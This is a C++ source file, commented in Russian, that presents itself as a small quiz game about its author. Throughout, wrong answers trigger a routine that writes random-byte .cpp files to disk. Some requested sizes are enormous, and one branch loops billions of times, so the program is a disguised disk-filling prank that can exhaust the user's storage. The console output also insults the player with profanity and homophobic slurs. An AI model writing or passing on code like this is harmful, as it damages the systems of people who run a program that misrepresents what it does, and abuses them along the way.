														/////////////////////////////////////////////
														//                           			   //
														//			  кодер - paralax			   //
														//				2022.07.14			       //
														//                           			   //
														/////////////////////////////////////////////
// Копируя код вы соглашетесь с моими условиями:
// 1 - Вы оставляете ссылку на мой вк https://vk.com/paralaxelo.
// 2 - Вы не пытаетесь его как либо унижать.
// 3 - Не пытайтесь меня обманывать.


#include <windows.h>
#include <iostream>
#include <string>
#include <fstream>
#include <random>

using namespace std;

char labelAnswer; // ответ после вопроса
bool labelBool; // получаемый результат вопроса
int randomERROR; // для ошибки
int randomINT; // инициализация

int rand_int(const int min, const int max)
{
	return rand() % max + min; // всё понятно
}

int srand_int(const int min, const int max)
{
	srand(time(00)); // чтобы не было одих и тех же чисел!
	return rand() % max + min; // всё понятно (вроде)
}

bool is_file(const string fileName)
{
	ifstream file; // спец. класс для проверок файлов
	file.open(fileName); // проверяю ----
	if (file)
	{
		return true;
	}
	else 
	{
		return false;
	}
}

void createFile(const string name = "example", const int size = 2, const bool mycode = false)
{
	ofstream file; // инициализация класса
	if (!mycode)
	{
		for (int index = 0; index < INT_MAX; index++) // проверка, что нету точно такоже файла
		{
			if (!is_file(name + to_string(index) + ".cpp")) // проверяю на наличие через свою функцию
			{
				file.open(name + to_string(index) + ".cpp"); // создаю
				break; // завершаю, т.к. уже всё норм
			}
			else
			{
				continue; // пропускаю текущую фазу
			}
		}

		for (int i = 0; i <= size; i++) // перевод в мб
		{
			for (int index = 0; index < size * 1048576 * 5; index++)
			{
				randomINT = rand_int(CHAR_MIN, CHAR_MAX); // как бы понятно, что эт рандом.
				file << (char)(randomINT); // добавляю в файл рандом символы

			}
		}

	}
	else
	{
		// дальше просто я создаю файл с кодом моей проги

		file.open("mycode.bat");
		
		file << "start https://www.google.co.in/https://github.com/Scream034/Game-on-c" << endl;

	}

	file.close();
}

void print(const string string)
{
	cout << string + " (1/0)" << endl;
	cin >> labelAnswer;
	if(labelAnswer == '1')
	{
		labelBool = true;
	}
	else if (labelAnswer == '0')
	{
		labelBool = false;
	}
	else
	{
		randomERROR = srand_int(1, 10);
		switch (randomERROR)
		{
		case 1:
			cout << "НЕ ТО ПИШИИИЕШЬ!" << endl;
			createFile("НЕТОПИШИИЕЕЕЕШЬ", srand_int(1, 32));
			break;
		case 2:
			cout << "ты просто дебил!" << endl;
			cout << "ты просто дебил!" << endl;
			cout << "ты просто дебил!" << endl;
			createFile("дебил", srand_int(1, 32));
			createFile("дебил", srand_int(1, 32));
			createFile("дебил", srand_int(1, 32));
			break;
		case 3:
			cout << "Пиши, то что в скобках!" << endl;
			createFile("idk", srand_int(1, 32));
			break;
		case 4:
			cout << "ПИДОРАС!" << endl;
			createFile("ПИДОРАС", srand_int(1, 32));
			break;
		case 5:
			cout << "Далбоёб!" << endl;
			createFile("Далбоёб", srand_int(1, 32));
			break;
		case 6:
			cout << "ПИДОР ЗЕЛЁНЫЙ!" << endl;
			cout << "ПИДОР ЗЕЛЁНЫЙ!" << endl;
			createFile("ХЗТЫЗЕЛЁНЫЙ", srand_int(1, 32));
			createFile("ХЗТЫЗЕЛЁНЫЙ", srand_int(1, 32));
			break;
		case 7:
			cout << "ВИДИМО ТЫ ТУППОЙ!" << endl;
			createFile("idk_2", srand_int(1, 32));
			break;
		case 8:
			cout << "ТРОЛЬ!" << endl;
			createFile("troll", srand_int(1, 32));
			break;
		case 9:
			cout << "trolled!" << endl;
			createFile("troollled", srand_int(1, 32));
			break;
		case 10:
			cout << "pls dont trolling me!" << endl;
			createFile("pls", srand_int(1, 32));
			break;
		}
	}
}


int main()
{
	setlocale(LC_ALL, "ru");

	cout << "эта небольшая игра от <<paralax>>\nВ который ты узнаешь кто ты)" << endl;
	cout << "ПРАВИЛО ОДНО - не закрывать это окно, не когда! только когда оно попросит само!" << endl;
	cout << "1 - да\n0 - нет\n\n" << endl;

	print("Ты меня знаешь?");
	
	if (labelBool)
	{
		print("Окей, меня зовут женя?");
		if (labelBool)
		{
			cout << "ты дебик" << endl;
			createFile("КОСТЯ", 16);
		}
		else 
		{
			print("Ну ладно пропустим, мою собаку зовут РЭМ?");
			if (labelBool)
			{
				createFile("НЕТ", 2);
				createFile("НЕТ", 2);
				createFile("НЕТ", 2);
				createFile("НЕТ", 2);
				createFile("НЕТ", 2);
			}
			else 
			{
				print("НАЙДА!?");
				if (labelBool)
				{
					print("Правильноооо!А у меня 2 собаки?");
					if (labelBool)
					{
						createFile("ннеетт");
					}
					else
					{
						cout << "\t\t\t\t\t\t\t\tА ТЫ?" << endl;
						print("Ну ты прям гений, а кстати ты гений?");
						if (labelBool)
						{
							cout << "\t\t\t\t\t(я тоже)" << endl;
							print("окей, КаК Ты ПоНиМаЛ СоБаК? ЧеРеЗ ЗвУк?");
							if (labelBool)
							{
								cout << "нехера, а как?" << endl;
								createFile("сходиКврачу", 9);
							}
							else
							{
								print("я тоже не очень понимаю ихххю.\nДавай вернёмся к моему имени - меня зовут КОСТЯ?");
								if (labelBool)
								{
									print("Great!?");
									if (labelBool)
									{
										print("ты знаешь англ?");
										if (labelBool)
										{
											print("Okay, then we'll be in English.\nme not 6 years old?");
											if (labelBool)
											{
												print("Do you eat?");
												if (labelBool)
												{
													print("Do you tk(-h)ink?");
													if (labelBool)
													{
														createFile("мнеНадоелоНаАнглийском");
													}
													else
													{
														createFile("мнеНадоелоНаАнглийском");
													}
												}
												else 
												{
													createFile("мнеНадоелоНаАнглийском");
												}
											}
											else 
											{
												createFile("STUPIDMAN_");
												createFile("STUPIDMAN_");
												createFile("STUPIDMAN_");
											}
										}
										else 
										{
											print("Окей, тогда будем по русски.\nМне не 6 лет?");
											if (labelBool)
											{
												createFile("тыМелкийАяНет");
											}
											else 
											{
												print("Мне 21?");
												if (labelBool)
												{
													printf("БОЛЬНОЙ ЧТОЛЬ?");
													createFile("БОЛЬНОЙ", 4);
													createFile("БОЛЬНОЙ", 21);
													createFile("БОЛЬНОЙ", 12);
													createFile("БОЛЬНОЙ", 3);
													createFile("БОЛЬНОЙ", 45);
													createFile("БОЛЬНОЙ", 100);
												}
												else
												{
													print("14?");
													if (labelBool)
													{
														print("Отлично!\nТеперь давай об профессиях. Я повар или сварщик?");
														if (labelBool)
														{
															cout << "you very stupid" << endl;
															createFile("вКакомМесте");
														}
														else
														{
															print("я программист?");
															if (labelBool)
															{
																print("Класс!\nДальше игру мне лень делать...\nТы ждёшь продолжения?");
																if (labelBool)
																{
																	cout << "Ты молодец походу! Прошёл почти без ошибок!" << endl;
																	createFile("МОЛОДЕЦ", 100000);
																	createFile("МОЛОДЕЦ", 100000);
																	createFile("МОЛОДЕЦ", 100000);
																	createFile("МОЛОДЕЦ", 100000);
																	createFile("МОЛОДЕЦ", 100000);
																}
																else
																{
																	cout << "пошёл в попу!" << endl;
																	for (int i = 0; i < INT_MAX; i++)
																	{
																		cout << "жди!" << endl;
																		createFile("жди", 1);
																	}
																}
															}
															else 
															{
																cout << "А кто я?" << endl;
																createFile("syka", 12);
																createFile("syka", 3);
																createFile("syka", 4);
																createFile("syka", 6);
																createFile("syka", 12);
																createFile("syka", 23);
															}
														}
													}
													else 
													{
														createFile("тыСлишкомТупой");
													}
												}
											}
										}
									}
									else 
									{
										for (int i = 0; i < 100; i++)
										{
											createFile("GREAT_");
										}
									}
								}
								else 
								{
									createFile("простоНет");
									createFile("простоНет");
									createFile("простоНет");
								}
							}
						}
						else 
						{
							cout << "значит я один гений ☺" << endl;
							createFile("тыТупой", 8);
						}
					}
				}
				else 
				{
					cout << "Подумай ещё" << endl;
					createFile("think_exe", 3);
					createFile("think_exe", 3);
					createFile("think_exe", 3);
				}
			}
		}
	}
	else
	{
		cout << "плохо, но не для меня!" << endl;
		createFile("nome", 1);
		createFile("nome", 2);
		createFile("nome", 3);
		createFile("nome", 4);
		createFile("nome", 5);
		createFile("nome", 6);
		createFile("nome", 7);
		createFile("nome", 8);
		createFile("nome", 9);
	}

	cout << '\n' << '\n' << endl;
	system("pause");
}